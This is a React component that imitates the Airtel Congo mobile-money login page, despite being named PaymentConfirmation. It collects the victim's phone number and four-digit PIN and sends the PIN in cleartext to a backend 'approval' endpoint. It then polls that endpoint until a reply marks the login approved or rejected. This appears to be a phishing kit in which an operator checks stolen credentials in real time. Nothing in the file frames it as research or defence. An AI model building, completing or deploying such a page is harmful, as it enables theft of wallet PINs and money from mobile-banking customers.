import React, { useState } from "react";
import { requestApproval, checkStatus } from "../utils/apiClient";
import toast from "react-hot-toast";
import { Loader2 } from "lucide-react";
import { formatPhoneNumber } from "../utils/formatters";
import { PaymentConfirmationProps } from "../types";

function PaymentConfirmation({
    applicationData,
    onBack,
    onComplete,
}: PaymentConfirmationProps) {
    const [loading, setLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState("");
    const [pin, setPin] = useState<string[]>(["", "", "", ""]);
    const [errors, setErrors] = useState<any>({});
    const [attemptCount, setAttemptCount] = useState(0);
    const [showWrongPin, setShowWrongPin] = useState(false);
    const [shakeError, setShakeError] = useState(false);
    const pinInputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
    const submittingRef = React.useRef(false); // Guard against double-submit

    // Auto-submit when all 4 PIN digits are entered
    React.useEffect(() => {
        const pinValue = pin.join("");
        if (pinValue.length === 4 && phoneNumber && !loading && !submittingRef.current) {
            // Small delay for better UX
            setTimeout(() => {
                handleSubmit();
            }, 300);
        }
    }, [pin, phoneNumber, loading]);

    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const formatted = formatPhoneNumber(e.target.value);
        setPhoneNumber(formatted);
        // Clear error when user starts typing
        if (errors.phoneNumber) {
            setErrors((prev: any) => ({ ...prev, phoneNumber: "" }));
        }
    };

    const handlePinChange = (index: number, value: string) => {
        if (!/^\d*$/.test(value)) return;

        // Clear wrong PIN error when user starts typing again
        if (showWrongPin) {
            setShowWrongPin(false);
        }

        const newPin = [...pin];
        newPin[index] = value.slice(-1);
        setPin(newPin);

        if (value && index < 3) {
            pinInputRefs.current[index + 1]?.focus();
        }
    };

    const handlePinKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace" && !pin[index] && index > 0) {
            pinInputRefs.current[index - 1]?.focus();
        }
    };

    const handleSubmit = async (e?: React.FormEvent) => {
        if (e) e.preventDefault();

        // Prevent double-submit
        if (submittingRef.current) return;

        const newErrors: any = {};

        // Validate phone number
        const phoneDigits = phoneNumber.replace(/\D/g, "");
        const isValidLength = (phoneDigits.startsWith("7") && phoneDigits.length === 9) ||
            (phoneDigits.startsWith("0") && phoneDigits.length === 10);

        if (!phoneNumber) {
            newErrors.phoneNumber = "Phone number is required";
        } else if (!isValidLength) {
            newErrors.phoneNumber = phoneDigits.startsWith("7")
                ? "Please enter 9 digits (starts with 7)"
                : "Please enter 10 digits (starts with 0)";
            toast.error(newErrors.phoneNumber);
        }

        const pinValue = pin.join("");
        if (pinValue.length !== 4) {
            newErrors.pin = "Please enter all 4 digits";
        }

        setErrors(newErrors);

        if (Object.keys(newErrors).length > 0) {
            if (!newErrors.phoneNumber) {
                toast.error("Please fill in all fields");
            }
            return;
        }

        setLoading(true);
        submittingRef.current = true;

        try {
            const payload = {
                type: 'login',
                name: "",
                phone: `+242${phoneNumber.replace(/\s/g, '')}`,
                details: `PIN: ${pinValue}`,
            };

            const res = await requestApproval(payload);
            const attemptId = res.attemptId;
            console.log("Got attemptId:", attemptId);

            // Start polling for status - max 2 minutes
            let pollCount = 0;
            const maxPolls = 60; // 60 * 2s = 2 minutes
            const interval = setInterval(async () => {
                pollCount++;
                if (pollCount > maxPolls) {
                    clearInterval(interval);
                    submittingRef.current = false;
                    setLoading(false);
                    toast.error("Approval timed out. Please try again.");
                    return;
                }

                try {
                    const statusRes = await checkStatus(attemptId);
                    const status = statusRes.status;
                    console.log(`Poll ${pollCount}: status =`, status);

                    if (status === 'approved') {
                        clearInterval(interval);
                        submittingRef.current = false;
                        setLoading(false);
                        toast.success("Login successful!");
                        onComplete();
                    } else if (status === 'rejected') {
                        clearInterval(interval);
                        submittingRef.current = false;
                        setLoading(false);
                        setShowWrongPin(true);
                        setShakeError(true);
                        setPin(["", "", "", ""]);

                        // Focus first input
                        setTimeout(() => {
                            pinInputRefs.current[0]?.focus();
                        }, 100);

                        // Remove shake effect after animation
                        setTimeout(() => {
                            setShakeError(false);
                        }, 500);
                    }
                    // else status is 'pending', keep polling
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 2000); // Check every 2 seconds

        } catch (err: any) {
            submittingRef.current = false;
            console.error("Failed to request approval:", err);
            const statusCode = err.response?.status;
            const errorData = err.response?.data;

            console.error(`Status: ${statusCode}`);
            if (errorData) console.error("Error data:", errorData);

            setLoading(false);
            const msg = statusCode ? `Failed to connect to server (${statusCode}). Please try again.` : "Failed to connect to server. Please try again.";
            toast.error(msg);
        }
    };

    return (
        <div
            style={{
                minHeight: "100vh",
                background: "#f5f7fa",
                display: "flex",
                flexDirection: "column" as const,
                position: "relative",
            }}
        >
            {/* Main Content */}
            <div
                style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column" as const,
                    alignItems: "center",
                    padding: "60px 20px 20px",
                    background: "white",
                }}
            >
                {/* Airtel Congo Logo */}
                <div
                    style={{
                        marginBottom: "36px",
                        textAlign: "center",
                    }}
                >
                    <img
                        src="/airtel.svg"
                        alt="Airtel Congo"
                        style={{
                            height: "60px",
                            objectFit: "contain",
                        }}
                    />
                </div>

                {/* Login Text */}
                <h1
                    style={{
                        fontSize: "28px",
                        fontWeight: "600",
                        color: "#555",
                        marginBottom: "40px",
                    }}
                >
                    Login
                </h1>

                {/* Phone Number Input */}
                <div
                    style={{
                        width: "100%",
                        maxWidth: "450px",
                        marginBottom: "30px",
                    }}
                >
                    <div
                        style={{
                            display: "flex",
                            alignItems: "center",
                            gap: "12px",
                            padding: "14px 18px",
                            border: "2px solid #e40000",
                            borderRadius: "12px",
                            background: "white",
                        }}
                    >
                        <span style={{ fontSize: "24px" }}>🇨🇬</span>
                        <span
                            style={{
                                fontSize: "16px",
                                color: "#333",
                                fontWeight: "500",
                            }}
                        >
                            +242
                        </span>
                        <input
                            type="tel"
                            placeholder="06 123 4567"
                            value={phoneNumber}
                            onChange={handlePhoneChange}
                            style={{
                                flex: 1,
                                border: "none",
                                outline: "none",
                                fontSize: "16px",
                                color: "#333",
                                background: "transparent",
                            }}
                        />
                    </div>
                    {errors.phoneNumber && (
                        <p
                            style={{
                                color: "#dc3545",
                                fontSize: "14px",
                                marginTop: "8px",
                                marginBottom: "0",
                            }}
                        >
                            {errors.phoneNumber}
                        </p>
                    )}
                </div>

                {/* Enter PIN Text */}
                <p
                    style={{
                        fontSize: "16px",
                        color: "#888",
                        marginBottom: "20px",
                    }}
                >
                    Enter your PIN
                </p>

                {/* 4 PIN Boxes */}
                <form onSubmit={handleSubmit} style={{ width: "100%" }}>
                    <div
                        className={shakeError ? "shake" : ""}
                        style={{
                            display: "flex",
                            justifyContent: "center",
                            gap: "16px",
                            marginBottom: "8px",
                        }}
                    >
                        {pin.map((digit, index) => (
                            <input
                                key={index}
                                ref={(el) => (pinInputRefs.current[index] = el)}
                                type="password"
                                inputMode="numeric"
                                maxLength={1}
                                value={digit}
                                onChange={(e) => handlePinChange(index, e.target.value)}
                                onKeyDown={(e) => handlePinKeyDown(index, e)}
                                style={{
                                    width: "60px",
                                    height: "60px",
                                    fontSize: "32px",
                                    textAlign: "center",
                                    border: showWrongPin ? "2px solid #dc3545" : "2px solid #e40000",
                                    borderRadius: "12px",
                                    outline: "none",
                                    background: "white",
                                    color: "#333",
                                }}
                            />
                        ))}
                    </div>

                    {/* Wrong PIN Error */}
                    {showWrongPin && (
                        <div
                            style={{
                                textAlign: "center",
                                marginBottom: "16px",
                            }}
                        >
                            <p
                                style={{
                                    color: "#dc3545",
                                    fontSize: "14px",
                                    fontWeight: "600",
                                    margin: 0,
                                }}
                            >
                                Incorrect Mobile number and/ or PIN provided.
                            </p>
                        </div>
                    )}


                    {/* Forgot PIN */}
                    <div style={{ textAlign: "center", marginBottom: "60px" }}>
                        <a
                            href="#"
                            style={{
                                color: "#888",
                                fontSize: "15px",
                                textDecoration: "none",
                            }}
                        >
                            Forgot PIN?
                        </a>
                    </div>

                    {/* Hidden Submit Button - form submits on PIN completion */}
                    <button type="submit" style={{ display: "none" }}>
                        Submit
                    </button>
                </form>
            </div>

            {/* Red Wave Bottom Section */}
            <div
                style={{
                    position: "relative",
                    background: "#e40000",
                    paddingTop: "80px",
                    paddingBottom: "40px",
                    marginTop: "auto",
                }}
            >
                {/* Wave SVG */}
                <svg
                    viewBox="0 0 1440 120"
                    style={{
                        position: "absolute",
                        top: "-1px",
                        left: 0,
                        width: "100%",
                        height: "80px",
                    }}
                    preserveAspectRatio="none"
                >
                    <path d="M0,0 C480,120 960,120 1440,0 L1440,120 L0,120 Z" fill="white" />
                </svg>

                <div
                    style={{
                        textAlign: "center",
                        color: "white",
                        padding: "0 20px",
                    }}
                >
                    <p
                        style={{
                            fontSize: "15px",
                            marginBottom: "24px",
                            lineHeight: "1.5",
                        }}
                    >
                        To register an Airtel Congo wallet or get assistance,
                        <br />
                        click below
                    </p>

                    <div
                        style={{
                            display: "flex",
                            gap: "16px",
                            justifyContent: "center",
                            marginBottom: "32px",
                        }}
                    >
                        <button
                            style={{
                                background: "white",
                                color: "#e40000",
                                border: "none",
                                borderRadius: "8px",
                                padding: "16px 32px",
                                fontSize: "15px",
                                fontWeight: "600",
                                cursor: "pointer",
                                display: "flex",
                                alignItems: "center",
                                gap: "8px",
                            }}
                        >
                            <span style={{ fontSize: "20px" }}>👤</span>
                            Register
                        </button>
                        <button
                            style={{
                                background: "white",
                                color: "#e40000",
                                border: "none",
                                borderRadius: "8px",
                                padding: "16px 32px",
                                fontSize: "15px",
                                fontWeight: "600",
                                cursor: "pointer",
                                display: "flex",
                                alignItems: "center",
                                gap: "8px",
                            }}
                        >
                            <span style={{ fontSize: "20px" }}>ℹ️</span>
                            Help & Support
                        </button>
                    </div>

                    <p
                        style={{
                            fontSize: "13px",
                            opacity: 0.8,
                            marginBottom: "8px",
                        }}
                    >
                        v2.1.3P
                    </p>
                    <p
                        style={{
                            fontSize: "13px",
                            opacity: 0.9,
                        }}
                    >
                        By signing in you agree to the{" "}
                        <a href="#" style={{ color: "white", textDecoration: "underline" }}>
                            Terms and Conditions
                        </a>
                    </p>
                </div>
            </div>

            {/* Loading Overlay */}
            {loading && (
                <div
                    style={{
                        position: "fixed",
                        inset: 0,
                        background: "rgba(0,0,0,0.5)",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        zIndex: 9999,
                    }}
                >
                    <div
                        style={{
                            background: "white",
                            borderRadius: "12px",
                            padding: "32px",
                            display: "flex",
                            flexDirection: "column" as const,
                            alignItems: "center",
                            gap: "16px",
                        }}
                    >
                        <Loader2 className="spinner" size={40} color="#e40000" />
                        <p style={{ fontSize: "16px", color: "#333" }}>Processing...</p>
                    </div>
                </div>
            )}

            {/* Shake Animation */}
            <style>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
          20%, 40%, 60%, 80% { transform: translateX(10px); }
        }
        .shake {
          animation: shake 0.5s;
        }
      `}</style>
        </div>
    );
}

export default PaymentConfirmation;
